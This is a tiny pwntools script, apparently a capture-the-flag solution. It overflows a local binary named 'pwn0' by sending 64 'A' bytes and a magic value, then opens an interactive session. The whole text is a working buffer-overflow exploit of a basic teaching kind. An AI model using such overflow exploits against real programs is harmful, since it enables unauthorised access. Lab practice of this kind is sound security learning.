from pwn import *

with process('./pwn0') as r:
    inp=b'A'*64+b'H!gh'
    r.sendline(inp)
    r.interactive()